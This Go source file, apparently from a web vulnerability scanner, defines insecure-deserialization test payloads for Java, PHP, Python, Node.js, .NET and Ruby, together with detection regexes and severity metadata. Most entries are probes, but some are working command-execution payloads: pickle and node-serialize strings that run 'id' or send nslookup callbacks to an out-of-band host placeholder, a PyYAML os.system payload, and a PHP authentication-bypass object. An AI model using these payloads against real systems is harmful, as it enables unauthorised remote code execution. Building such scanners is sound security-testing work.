package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Insecure Deserialization Payloads â€” Sourced from PayloadsAllTheThings
// Covers: Java (Commons Collections, Spring, JBoss), PHP (unserialize),
//         Python (pickle, PyYAML), Node.js (node-serialize), .NET (BinaryFormatter,
//         ObjectStateFormatter), Ruby (Marshal)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func InsecureDeserializationPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatInsecureDeserial,
		Description: "Insecure Deserialization â€” PayloadsAllTheThings + CWE-502",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization",
		Payloads:    deserialAll(),
	}
}

func deserialAll() []Payload {
	var all []Payload
	all = append(all, deserialJava()...)
	all = append(all, deserialPHP()...)
	all = append(all, deserialPython()...)
	all = append(all, deserialNode()...)
	all = append(all, deserialDotNet()...)
	all = append(all, deserialRuby()...)
	return all
}

// â”€â”€â”€â”€ Java Deserialization (PayloadsAllTheThings Java section) â”€â”€â”€â”€
func deserialJava() []Payload {
	return []Payload{
		{
			ID: "deser-java-acc-magic", Category: CatInsecureDeserial,
			Technique: TechJavaDeserial,
			Name: "Java Serialized Object Magic Bytes", Value: "\xac\xed\x00\x05",
			Contexts:  []InjectionContext{CtxFormBody, CtxHTTPHeader, CtxCookie},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(ClassNotFoundException|InvalidClassException|StreamCorruptedException|java\.io\.ObjectInputStream|deserialization)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"Java"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Java serialization magic bytes (AC ED 00 05) probe â€” detects deserialization endpoints",
			Reference: "PayloadsAllTheThings", Tags: []string{"java", "probe"}, Enabled: true,
		},
		{
			ID: "deser-java-base64-magic", Category: CatInsecureDeserial,
			Technique: TechJavaDeserial,
			Name: "Base64 Java Serialized Magic", Value: `rO0ABX`,
			Contexts:  []InjectionContext{CtxFormBody, CtxHTTPHeader, CtxCookie, CtxURLQuery},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(ClassNotFoundException|InvalidClassException|StreamCorrupted|ObjectInputStream)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"Java"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Base64 prefix of Java serialized stream â€” detects base64-wrapped deserialization",
			Reference: "PayloadsAllTheThings", Tags: []string{"java", "base64", "probe"}, Enabled: true,
		},
		{
			ID: "deser-java-dns-ysoserial", Category: CatInsecureDeserial,
			Technique: TechJavaDeserial,
			Name: "Java DNS Exfil (ysoserial URLDNS)", Value: `VYOMITE_OOB_HOST`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectOOBCallback,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Java"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "ysoserial URLDNS gadget â€” triggers DNS lookup to confirm deserialization without RCE",
			Reference: "PayloadsAllTheThings", Tags: []string{"java", "ysoserial", "oob"}, Enabled: true,
		},
		{
			ID: "deser-java-sleep-cc", Category: CatInsecureDeserial,
			Technique: TechJavaDeserial,
			Name: "Java Sleep (Commons Collections)", Value: `commons-collections-sleep-5000`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectTimeDelta, DelayMs: 5000,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Java"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Commons Collections gadget chain with Thread.sleep(5000) for blind confirmation",
			Reference: "PayloadsAllTheThings", Tags: []string{"java", "commons_collections", "time_blind"}, Enabled: true,
		},
	}
}

// â”€â”€â”€â”€ PHP Deserialization (PayloadsAllTheThings PHP section) â”€â”€â”€â”€
func deserialPHP() []Payload {
	return []Payload{
		{
			ID: "deser-php-object-inject", Category: CatInsecureDeserial,
			Technique: TechPHPDeserial,
			Name: "PHP Object Injection Probe", Value: `O:8:"stdClass":0:{}`,
			Contexts:  []InjectionContext{CtxURLQuery, CtxFormBody, CtxCookie},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(unserialize|__wakeup|__destruct|allowed_classes)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"PHP"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "PHP serialized stdClass object â€” probes for unserialize() call",
			Reference: "PayloadsAllTheThings", Tags: []string{"php", "probe"}, Enabled: true,
		},
		{
			ID: "deser-php-bool-bypass", Category: CatInsecureDeserial,
			Technique: TechPHPDeserial,
			Name: "PHP Boolean Auth Bypass", Value: `O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"PHP"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "PHP serialized boolean true for password â€” bypasses loose comparison",
			Reference: "PayloadsAllTheThings", Tags: []string{"php", "auth_bypass"}, Enabled: true,
		},
		{
			ID: "deser-php-phar", Category: CatInsecureDeserial,
			Technique: TechPHPDeserial,
			Name: "PHP Phar Deserialization", Value: `phar://vyomite-test.phar`,
			Contexts:  []InjectionContext{CtxURLQuery, CtxFormBody},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(phar|RecursiveDirectoryIterator|__destruct)`,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"PHP"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "PHP Phar stream wrapper triggers deserialization via file operations",
			Reference: "PayloadsAllTheThings", Tags: []string{"php", "phar"}, Enabled: true,
		},
	}
}

// â”€â”€â”€â”€ Python Deserialization (PayloadsAllTheThings Python section) â”€â”€â”€â”€
func deserialPython() []Payload {
	return []Payload{
		{
			ID: "deser-python-pickle-probe", Category: CatInsecureDeserial,
			Technique: TechPythonDeserial,
			Name: "Python Pickle Probe", Value: `\x80\x04\x95`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(unpickling|pickle|_pickle|UnpicklingError)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"Python"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Python pickle protocol 4 header bytes â€” probes for pickle deserialization",
			Reference: "PayloadsAllTheThings", Tags: []string{"python", "pickle", "probe"}, Enabled: true,
		},
		{
			ID: "deser-python-pickle-dns", Category: CatInsecureDeserial,
			Technique: TechPythonDeserial,
			Name: "Python Pickle DNS Exfil", Value: `cos\nsystem\n(S'nslookup vyomite-pickle.VYOMITE_OOB_HOST'\ntR.`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectOOBCallback,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Python"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Python pickle __reduce__ RCE with DNS exfiltration â€” PayloadsAllTheThings",
			Reference: "PayloadsAllTheThings", Tags: []string{"python", "pickle", "oob"}, Enabled: true,
		},
		{
			ID: "deser-python-yaml-load", Category: CatInsecureDeserial,
			Technique: TechPythonDeserial,
			Name: "PyYAML Unsafe Load", Value: `!!python/object/apply:os.system ['id']`,
			Contexts:  []InjectionContext{CtxFormBody},
			Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Python"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "PyYAML !!python/object/apply tag â€” RCE via yaml.load()",
			Reference: "PayloadsAllTheThings", Tags: []string{"python", "yaml"}, Enabled: true,
		},
	}
}

// â”€â”€â”€â”€ Node.js Deserialization (PayloadsAllTheThings Node section) â”€â”€â”€â”€
func deserialNode() []Payload {
	return []Payload{
		{
			ID: "deser-node-serialize", Category: CatInsecureDeserial,
			Technique: TechNodeDeserial,
			Name: "Node.js node-serialize IIFE", Value: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxCookie, CtxFormBody},
			Detection: DetectReflection, DetectSignature: `uid=[0-9]+\(`,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Node.js"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "node-serialize IIFE RCE via _$$ND_FUNC$$_ â€” PayloadsAllTheThings",
			Reference: "PayloadsAllTheThings", Tags: []string{"nodejs", "node_serialize"}, Enabled: true,
		},
		{
			ID: "deser-node-serialize-dns", Category: CatInsecureDeserial,
			Technique: TechNodeDeserial,
			Name: "Node.js Serialize DNS Exfil", Value: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup vyomite-node.VYOMITE_OOB_HOST')}()"}`,
			Contexts:  []InjectionContext{CtxJSONBody, CtxCookie},
			Detection: DetectOOBCallback,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Node.js"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "node-serialize DNS exfiltration via OOB callback",
			Reference: "PayloadsAllTheThings", Tags: []string{"nodejs", "oob"}, Enabled: true,
		},
	}
}

// â”€â”€â”€â”€ .NET Deserialization â”€â”€â”€â”€
func deserialDotNet() []Payload {
	return []Payload{
		{
			ID: "deser-dotnet-viewstate-probe", Category: CatInsecureDeserial,
			Technique: TechDotNetDeserial,
			Name: "ASP.NET ViewState Probe", Value: `__VIEWSTATE=AAEAAAD/`,
			Contexts:  []InjectionContext{CtxFormBody},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(ViewState|MAC validation|BinaryFormatter|ObjectStateFormatter|invalid viewstate)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{".NET", "ASP.NET"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "ASP.NET ViewState BinaryFormatter probe â€” detects unprotected deserialization",
			Reference: "PayloadsAllTheThings", Tags: []string{"dotnet", "viewstate", "probe"}, Enabled: true,
		},
		{
			ID: "deser-dotnet-typenamelevel", Category: CatInsecureDeserial,
			Technique: TechDotNetDeserial,
			Name: ".NET TypeNameHandling Probe", Value: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`,
			Contexts:  []InjectionContext{CtxJSONBody},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(TypeNameHandling|JsonSerializationException|ResolveType|System\.Diagnostics)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{".NET"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: ".NET JSON TypeNameHandling probe â€” Newtonsoft.Json $type gadget detection",
			Reference: "PayloadsAllTheThings", Tags: []string{"dotnet", "json_net", "probe"}, Enabled: true,
		},
	}
}

// â”€â”€â”€â”€ Ruby Deserialization â”€â”€â”€â”€
func deserialRuby() []Payload {
	return []Payload{
		{
			ID: "deser-ruby-marshal-probe", Category: CatInsecureDeserial,
			Technique: TechRubyDeserial,
			Name: "Ruby Marshal.load Probe", Value: "\x04\x08",
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(Marshal|ArgumentError|incompatible marshal|dump format)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			TargetStack: []string{"Ruby"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Ruby Marshal magic bytes probe â€” detects Marshal.load() usage",
			Reference: "PayloadsAllTheThings", Tags: []string{"ruby", "marshal", "probe"}, Enabled: true,
		},
		{
			ID: "deser-ruby-erb-universal", Category: CatInsecureDeserial,
			Technique: TechRubyDeserial,
			Name: "Ruby Universal RCE Gadget", Value: `Gem::Installer`,
			Contexts:  []InjectionContext{CtxFormBody, CtxCookie},
			Detection: DetectOOBCallback,
			Severity: SevCritical, SafeMode: false, CVSSScore: 9.8,
			TargetStack: []string{"Ruby"}, CWE: "CWE-502", OWASPCategory: "A08:2021",
			Description: "Ruby Universal RCE deserialization gadget chain (Gem::Installer)",
			Reference: "PayloadsAllTheThings", Tags: []string{"ruby", "rce"}, Enabled: true,
		},
	}
}
